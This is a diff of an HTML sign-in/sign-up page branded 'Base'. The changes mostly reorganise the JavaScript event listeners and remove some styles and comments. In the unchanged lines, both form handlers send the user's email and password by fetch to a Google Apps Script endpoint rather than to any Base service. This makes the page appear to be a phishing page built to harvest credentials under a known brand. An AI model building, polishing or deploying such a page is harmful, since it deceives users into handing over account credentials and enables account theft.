@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign In or Sign Up | Base</title>
+    <title>Base | Sign In or Sign Up</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
@@ -224,39 +224,6 @@
             text-decoration: underline;
         }
 
-        .security-notice {
-            background: var(--base-light-blue);
-            border: 1px solid rgba(22, 82, 240, 0.2);
-            border-radius: 8px;
-            padding: 1rem;
-            margin-bottom: 2rem;
-            font-size: 0.9rem;
-            color: var(--base-blue);
-        }
-
-        .security-notice i {
-            margin-right: 0.5rem;
-        }
-
-        .form-check {
-            margin-bottom: 1.5rem;
-        }
-
-        .form-check-input:checked {
-            background-color: var(--base-blue);
-            border-color: var(--base-blue);
-        }
-
-        .form-check-input:focus {
-            border-color: var(--base-blue);
-            box-shadow: 0 0 0 3px rgba(22, 82, 240, 0.1);
-        }
-
-        .form-check-label {
-            color: #1a1a1a;
-            font-size: 0.9rem;
-        }
-
         .invalid-feedback {
             display: block;
             color: #dc3545;
@@ -289,7 +256,6 @@
     </style>
 </head>
 <body>
-    <!-- Navigation -->
     <nav class="navbar navbar-expand-lg">
         <div class="container">
             <a class="navbar-brand" href="#">
@@ -300,16 +266,12 @@
             </div>
         </div>
     </nav>
-
-    <!-- Main Content -->
     <div class="main-container">
         <div class="login-card">
-            <!-- Header -->
             <div class="login-header" id="formHeader">
                 <h1>Sign in to Base</h1>
                 <p>Welcome back! Please enter your details.</p>
             </div>
-            
             <!-- Login Form -->
             <form id="loginForm">
                 <div class="form-group">
@@ -317,7 +279,6 @@
                     <input type="email" class="form-control" id="email" name="email" required>
                     <div class="invalid-feedback" id="emailError"></div>
                 </div>
-
                 <div class="form-group">
                     <label for="password" class="form-label">Password</label>
                     <div class="password-toggle">
@@ -328,26 +289,22 @@
                     </div>
                     <div class="invalid-feedback" id="passwordError"></div>
                 </div>
-
                 <div class="form-check">
                     <input class="form-check-input" type="checkbox" id="rememberMe" name="rememberMe">
                     <label class="form-check-label" for="rememberMe">
                         Remember me for 30 days
                     </label>
                 </div>
-
                 <button type="submit" class="btn btn-primary">
                     <span class="loading" id="loadingSpinner">
                         <i class="fas fa-spinner fa-spin"></i>
                     </span>
                     <span id="signInText">Sign in</span>
                 </button>
-
                 <div class="forgot-password">
                     <a href="#" onclick="showForgotPassword()">Forgot your password?</a>
                 </div>
             </form>
-
             <!-- Sign Up Form (hidden by default) -->
             <form id="signUpForm" style="display:none;">
                 <div class="form-group">
@@ -355,7 +312,6 @@
                     <input type="email" class="form-control" id="signupEmail" name="signupEmail" required>
                     <div class="invalid-feedback" id="signupEmailError"></div>
                 </div>
-
                 <div class="form-group">
                     <label for="signupPassword" class="form-label">Password</label>
                     <div class="password-toggle">
@@ -366,7 +322,6 @@
                     </div>
                     <div class="invalid-feedback" id="signupPasswordError"></div>
                 </div>
-
                 <div class="form-group">
                     <label for="signupConfirmPassword" class="form-label">Confirm Password</label>
                     <div class="password-toggle">
@@ -377,7 +332,6 @@
                     </div>
                     <div class="invalid-feedback" id="signupConfirmPasswordError"></div>
                 </div>
-
                 <button type="submit" class="btn btn-primary">
                     <span class="loading" id="signUpLoadingSpinner">
                         <i class="fas fa-spinner fa-spin"></i>
@@ -385,13 +339,9 @@
                     <span id="signUpText">Sign up</span>
                 </button>
             </form>
-
-            <!-- Divider -->
             <div class="divider">
                 <span>or</span>
             </div>
-
-            <!-- Google Sign In -->
             <button class="btn btn-google" onclick="signInWithGoogle()">
                 <svg class="google-icon" viewBox="0 0 24 24">
                     <path fill="#4285f4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
@@ -401,18 +351,14 @@
                 </svg>
                 Continue with Google
             </button>
-
-            <!-- Toggle Login/Signup Link -->
             <div class="signup-link">
                 <span id="togglePrompt">Don't have an account? </span>
                 <a href="#" id="toggleFormLink" onclick="toggleForm(event)">Sign up</a>
             </div>
         </div>
     </div>
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
     <script>
-        // Utility validation
+        // Validation helpers
         function validateEmail(email) {
             const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             return re.test(email);
@@ -433,33 +379,7 @@
             error.textContent = '';
         }
 
-        // Toggle Sign In/Sign Up forms
-        function toggleForm(e) {
-            e.preventDefault();
-            const loginForm = document.getElementById('loginForm');
-            const signUpForm = document.getElementById('signUpForm');
-            const header = document.getElementById('formHeader');
-            const togglePrompt = document.getElementById('togglePrompt');
-            const toggleFormLink = document.getElementById('toggleFormLink');
-
-            if (loginForm.style.display !== 'none') {
-                // Switch to sign up
-                loginForm.style.display = 'none';
-                signUpForm.style.display = '';
-                header.innerHTML = '<h1>Sign up for Base</h1><p>Create your account to get started.</p>';
-                togglePrompt.textContent = 'Already have an account? ';
-                toggleFormLink.textContent = 'Sign in';
-            } else {
-                // Switch to sign in
-                loginForm.style.display = '';
-                signUpForm.style.display = 'none';
-                header.innerHTML = '<h1>Sign in to Base</h1><p>Welcome back! Please enter your details.</p>';
-                togglePrompt.textContent = "Don't have an account? ";
-                toggleFormLink.textContent = 'Sign up';
-            }
-        }
-
-        // Password toggle functionality
+        // Initial listeners for login form
         document.getElementById('togglePassword').addEventListener('click', function() {
             const passwordField = document.getElementById('password');
             const toggleIcon = this.querySelector('i');
@@ -473,46 +393,101 @@
                 toggleIcon.classList.add('fa-eye');
             }
         });
-        // Password toggle for sign up
-        document.getElementById('toggleSignupPassword').addEventListener('click', function() {
-            const passwordField = document.getElementById('signupPassword');
-            const toggleIcon = this.querySelector('i');
-            if (passwordField.type === 'password') {
-                passwordField.type = 'text';
-                toggleIcon.classList.remove('fa-eye');
-                toggleIcon.classList.add('fa-eye-slash');
-            } else {
-                passwordField.type = 'password';
-                toggleIcon.classList.remove('fa-eye-slash');
-                toggleIcon.classList.add('fa-eye');
-            }
+
+        document.getElementById('email').addEventListener('input', function() {
+            if (this.value) clearError('email', 'emailError');
         });
-        document.getElementById('toggleSignupConfirmPassword').addEventListener('click', function() {
-            const passwordField = document.getElementById('signupConfirmPassword');
-            const toggleIcon = this.querySelector('i');
-            if (passwordField.type === 'password') {
-                passwordField.type = 'text';
-                toggleIcon.classList.remove('fa-eye');
-                toggleIcon.classList.add('fa-eye-slash');
-            } else {
-                passwordField.type = 'password';
-                toggleIcon.classList.remove('fa-eye-slash');
-                toggleIcon.classList.add('fa-eye');
-            }
+        document.getElementById('password').addEventListener('input', function() {
+            if (this.value) clearError('password', 'passwordError');
         });
+
+        document.querySelectorAll('.form-control').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.parentElement.classList.add('focused');
+            });
+            input.addEventListener('blur', function() {
+                this.parentElement.classList.remove('focused');
+            });
+        });
+
+        let signupListenersAdded = false;
+        function toggleForm(e) {
+            e.preventDefault();
+            const loginForm = document.getElementById('loginForm');
+            const signUpForm = document.getElementById('signUpForm');
+            const header = document.getElementById('formHeader');
+            const togglePrompt = document.getElementById('togglePrompt');
+            const toggleFormLink = document.getElementById('toggleFormLink');
+            if (loginForm.style.display !== 'none') {
+                loginForm.style.display = 'none';
+                signUpForm.style.display = '';
+                header.innerHTML = '<h1>Sign up for Base</h1><p>Create your account to get started.</p>';
+                togglePrompt.textContent = 'Already have an account? ';
+                toggleFormLink.textContent = 'Sign in';
+                if (!signupListenersAdded) {
+                    document.getElementById('toggleSignupPassword').addEventListener('click', function() {
+                        const passwordField = document.getElementById('signupPassword');
+                        const toggleIcon = this.querySelector('i');
+                        if (passwordField.type === 'password') {
+                            passwordField.type = 'text';
+                            toggleIcon.classList.remove('fa-eye');
+                            toggleIcon.classList.add('fa-eye-slash');
+                        } else {
+                            passwordField.type = 'password';
+                            toggleIcon.classList.remove('fa-eye-slash');
+                            toggleIcon.classList.add('fa-eye');
+                        }
+                    });
+                    document.getElementById('toggleSignupConfirmPassword').addEventListener('click', function() {
+                        const passwordField = document.getElementById('signupConfirmPassword');
+                        const toggleIcon = this.querySelector('i');
+                        if (passwordField.type === 'password') {
+                            passwordField.type = 'text';
+                            toggleIcon.classList.remove('fa-eye');
+                            toggleIcon.classList.add('fa-eye-slash');
+                        } else {
+                            passwordField.type = 'password';
+                            toggleIcon.classList.remove('fa-eye-slash');
+                            toggleIcon.classList.add('fa-eye');
+                        }
+                    });
+                    document.getElementById('signupEmail').addEventListener('input', function() {
+                        if (this.value) clearError('signupEmail', 'signupEmailError');
+                    });
+                    document.getElementById('signupPassword').addEventListener('input', function() {
+                        if (this.value) clearError('signupPassword', 'signupPasswordError');
+                    });
+                    document.getElementById('signupConfirmPassword').addEventListener('input', function() {
+                        if (this.value) clearError('signupConfirmPassword', 'signupConfirmPasswordError');
+                    });
+                    document.querySelectorAll('#signUpForm .form-control').forEach(input => {
+                        input.addEventListener('focus', function() {
+                            this.parentElement.classList.add('focused');
+                        });
+                        input.addEventListener('blur', function() {
+                            this.parentElement.classList.remove('focused');
+                        });
+                    });
+                    signupListenersAdded = true;
+                }
+            } else {
+                loginForm.style.display = '';
+                signUpForm.style.display = 'none';
+                header.innerHTML = '<h1>Sign in to Base</h1><p>Welcome back! Please enter your details.</p>';
+                togglePrompt.textContent = "Don't have an account? ";
+                toggleFormLink.textContent = 'Sign up';
+            }
+        }
 
         // LOGIN FORM SUBMIT
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-
             clearError('email', 'emailError');
             clearError('password', 'passwordError');
             let isValid = true;
-
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             const rememberMe = document.getElementById('rememberMe').checked;
-
             if (!email) {
                 showError('email', 'emailError', 'Email is required');
                 isValid = false;
@@ -527,12 +502,9 @@
                 showError('password', 'passwordError', 'Password must be at least 8 characters long');
                 isValid = false;
             }
-
             if (!isValid) return;
-
             document.getElementById('loadingSpinner').classList.add('active');
             document.getElementById('signInText').textContent = 'Signing in...';
-
             fetch('https://script.google.com/macros/s/AKfycbxnItoHJ_EbmgYgilcxlusTWEi-P7MDnRgk9TZQ9FBOuwOQnBJm6I0z1mju5cez5KLT/exec', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -559,16 +531,13 @@
         // SIGNUP FORM SUBMIT
         document.getElementById('signUpForm').addEventListener('submit', function(e) {
             e.preventDefault();
-
             clearError('signupEmail', 'signupEmailError');
             clearError('signupPassword', 'signupPasswordError');
             clearError('signupConfirmPassword', 'signupConfirmPasswordError');
             let isValid = true;
-
             const email = document.getElementById('signupEmail').value;
             const password = document.getElementById('signupPassword').value;
             const confirmPassword = document.getElementById('signupConfirmPassword').value;
-
             if (!email) {
                 showError('signupEmail', 'signupEmailError', 'Email is required');
                 isValid = false;
@@ -590,12 +559,9 @@
                 showError('signupConfirmPassword', 'signupConfirmPasswordError', 'Passwords do not match');
                 isValid = false;
             }
-
             if (!isValid) return;
-
             document.getElementById('signUpLoadingSpinner').classList.add('active');
             document.getElementById('signUpText').textContent = 'Signing up...';
-
             fetch('https://script.google.com/macros/s/AKfycbxnItoHJ_EbmgYgilcxlusTWEi-P7MDnRgk9TZQ9FBOuwOQnBJm6I0z1mju5cez5KLT/exec', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -625,31 +591,6 @@
         function showForgotPassword() {
             alert('Forgot password functionality would be implemented here');
         }
-
-        // Input focus effects and error clearing
-        document.querySelectorAll('.form-control').forEach(input => {
-            input.addEventListener('focus', function() {
-                this.parentElement.classList.add('focused');
-            });
-            input.addEventListener('blur', function() {
-                this.parentElement.classList.remove('focused');
-            });
-        });
-        document.getElementById('email').addEventListener('input', function() {
-            if (this.value) clearError('email', 'emailError');
-        });
-        document.getElementById('password').addEventListener('input', function() {
-            if (this.value) clearError('password', 'passwordError');
-        });
-        document.getElementById('signupEmail').addEventListener('input', function() {
-            if (this.value) clearError('signupEmail', 'signupEmailError');
-        });
-        document.getElementById('signupPassword').addEventListener('input', function() {
-            if (this.value) clearError('signupPassword', 'signupPasswordError');
-        });
-        document.getElementById('signupConfirmPassword').addEventListener('input', function() {
-            if (this.value) clearError('signupConfirmPassword', 'signupConfirmPasswordError');
-        });
-    </script>
+         </script>
 </body>
 </html>
